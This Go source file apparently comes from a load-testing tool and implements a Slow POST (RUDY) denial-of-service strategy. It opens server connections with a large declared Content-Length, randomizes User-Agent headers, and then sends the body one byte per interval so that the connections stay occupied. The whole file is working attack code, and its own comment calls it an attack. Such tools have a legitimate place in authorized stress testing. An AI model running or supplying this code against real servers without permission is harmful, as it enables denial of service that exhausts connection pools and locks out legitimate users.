package strategy

import (
	"context"
	"math/rand"
	"sync/atomic"
	"time"

	"github.com/jdw/loadtestforge/internal/config"
	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"
)

// SlowPost implements the Slow POST (RUDY) attack.
// It sends POST request with large Content-Length but transmits body very slowly,
// one byte at a time, to occupy server connections.
type SlowPost struct {
	sendInterval      time.Duration
	contentLength     int
	connConfig        netutil.ConnConfig
	headerRandomizer  *httpdata.HeaderRandomizer
	activeConnections int64
	metricsCallback   MetricsCallback
}

func NewSlowPost(sendInterval time.Duration, contentLength int, bindIP string) *SlowPost {
	return &SlowPost{
		sendInterval:     sendInterval,
		contentLength:    contentLength,
		connConfig:       netutil.DefaultConnConfig(bindIP),
		headerRandomizer: httpdata.DefaultHeaderRandomizer(),
	}
}

// SetMetricsCallback sets the metrics callback for telemetry.
func (s *SlowPost) SetMetricsCallback(callback MetricsCallback) {
	s.metricsCallback = callback
}

func (s *SlowPost) Execute(ctx context.Context, target Target) error {
	connID := generateConnID()
	startTime := time.Now()

	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	// Record connection start
	if s.metricsCallback != nil {
		s.metricsCallback.RecordConnectionStart(connID, mc.RemoteAddr().String())
	}

	userAgent := httpdata.RandomUserAgent()

	// Build POST request with large Content-Length
	postRequest := s.headerRandomizer.BuildPOSTRequest(
		parsedURL,
		userAgent,
		s.contentLength,
		"application/x-www-form-urlencoded",
	)

	if _, err := mc.WriteWithTimeout([]byte(postRequest), config.DefaultWriteTimeout); err != nil {
		if s.metricsCallback != nil {
			s.metricsCallback.RecordSocketTimeout()
		}
		return err
	}

	// Record initial success
	if s.metricsCallback != nil {
		s.metricsCallback.RecordSuccessWithLatency(time.Since(startTime))
	}

	ticker := time.NewTicker(s.sendInterval)
	defer ticker.Stop()

	bytesSent := 0
	bodyChars := "abcdefghijklmnopqrstuvwxyz0123456789"

	for {
		select {
		case <-mc.Context().Done():
			if s.metricsCallback != nil {
				s.metricsCallback.RecordConnectionEnd(connID)
			}
			return nil
		case <-ticker.C:
			if bytesSent >= s.contentLength {
				// Reset and start new request
				bytesSent = 0
				if _, err := mc.WriteWithTimeout([]byte(postRequest), config.DefaultWriteTimeout); err != nil {
					if s.metricsCallback != nil {
						s.metricsCallback.RecordSocketTimeout()
						s.metricsCallback.RecordConnectionEnd(connID)
					}
					return err
				}
				continue
			}

			// Send single byte of body
			bodyByte := bodyChars[rand.Intn(len(bodyChars))]
			if _, err := mc.WriteWithTimeout([]byte{byte(bodyByte)}, config.DefaultWriteTimeout); err != nil {
				if s.metricsCallback != nil {
					s.metricsCallback.RecordSocketTimeout()
					s.metricsCallback.RecordConnectionEnd(connID)
				}
				return err
			}
			bytesSent++

			// Record activity periodically (every 100 bytes)
			if s.metricsCallback != nil && bytesSent%100 == 0 {
				s.metricsCallback.RecordConnectionActivity(connID)
			}
		}
	}
}

func (s *SlowPost) Name() string {
	return "slow-post"
}

func (s *SlowPost) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
